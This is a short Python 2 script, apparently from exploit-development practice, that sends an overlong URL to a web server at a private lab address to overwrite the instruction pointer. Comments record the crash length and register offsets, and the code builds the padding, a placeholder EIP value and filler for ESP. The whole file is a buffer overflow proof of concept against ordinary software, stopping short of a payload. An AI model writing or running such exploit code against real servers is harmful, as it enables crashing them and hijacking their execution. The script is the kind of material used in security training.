#!/usr/bin/env python2

import requests

# appears to break at 5000

# offsets
# EIP 1786
# ESP 1790
# EBX 1782

eip_offset = 1786
buf_len = 5000

padding = "A" * eip_offset
eip = "BBBB"
esp_content = "C" * (buf_len - len(padding) - len(eip))

buf = padding + eip + esp_content

url= "http://10.10.10.2/" + buf
r = requests.get(url)
